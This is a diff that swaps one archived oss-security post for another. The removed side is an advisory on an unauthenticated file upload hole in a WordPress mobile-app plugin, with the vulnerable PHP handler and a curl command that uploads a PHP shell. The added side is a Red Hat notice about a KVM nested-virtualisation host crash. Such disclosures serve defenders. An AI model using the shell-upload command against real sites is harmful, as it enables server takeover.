@@ -1,46 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/02/12
-Message-id: <798D4367-AFCB-43FF-A603-F296E7E38ECE@me.com>
-Date: Thu, 02 Mar 2017 13:52:23 -0500
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/26/3
+Message-ID: <nycvar.YSQ.7.76.1709261022090.10045@wniryva>
+Date: Tue, 26 Sep 2017 10:26:27 +0530 (IST)
+From: P J P <ppandit@...hat.com>
+To: oss security list <oss-security@...ts.openwall.com>
+cc: Jim Mattson <jmattson@...gle.com>
+Subject: CVE-2017-12154 Kernel: kvm: nVMX: L2 guest could access hardware(L0) CR8 register
 Content-Type: text/plain; charset=utf-8
 
-Title: Remote file upload vulnerability in Wordpress Plugin Mobile App Native 3.0
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-02-27
-Download Site: https://wordpress.org/plugins/zen-mobile-app-native/
-Vendor: https://profiles.wordpress.org/zendkmobileapp/
-Vendor Notified: 2017-02-27
-Vendor Contact:
-Description: Mobile App WordPress plugin lets you turn your website into a full-featured mobile application in minutes using Mobile App Builder.
-Vulnerability:
-The code in file ./zen-mobile-app-native/server/images.php doesn't require authentication or check that the user is allowed to upload content.
-It also doesn't sanitize the file upload against executable code.
+   Hello,
 
-<?php
-//header('content-type: text/html; charset=iso-8859-2');
-header('Content-Type: text/html; charset=utf-8');
-header('Access-Control-Allow-Origin: *');
-require_once('function.php');
+Linux kernel built with the KVM virtualisation support(CONFIG_KVM), with 
+nested virtualisation(nVMX) feature enabled(nested=1), is vulnerable to a 
+crash due to disabled external interrupts. As L2 guest could access(r/w) 
+hardware CR8 register of the host(L0).
 
-if ($_FILES['file']['name']) {
-if (!$_FILES['file']['error']) {
-$name = md5(rand(100, 200));
-$ext = explode('.', $_FILES['file']['name']);
-$filename = $name . '.' . $ext[1];
-$destination = 'images/' . $filename;
-$location = $_FILES["file"]["tmp_name"];
-move_uploaded_file($location, $destination);
-echo $plugin_url.'/server/images/' . $filename;
-}
-else {
-echo $message = 'Ooops! Your upload triggered the following error: '.$_FILES['file']['error'];
-}
-}
-CVE-ID: CVE-2017-6104
-Exploit Code:
-$ curl -F "file=@...r/www/shell.php" "http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native/server/images.php"
-http://example.com/wordpress/wp-content/plugins/zen-mobile-app-native//server/images/8d5e957f297893487bd98fa830fa6413.php
-Advisory: http://www.vapidlabs.com/advisory.php?v=178
+In a nested virtualisation setup, L2 guest user could use this flaw to 
+potentially crash the host(L0) resulting in DoS.
+
+Upstream patch
+--------------
+   -> https://git.kernel.org/linus/51aa68e7d57e3217192d88ce90fd5b8ef29ec94f
+
+This issue was reported by Jim Mattson of Google.com.
+
+Thank you.
+--
+Prasad J Pandit / Red Hat Product Security Team
+47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
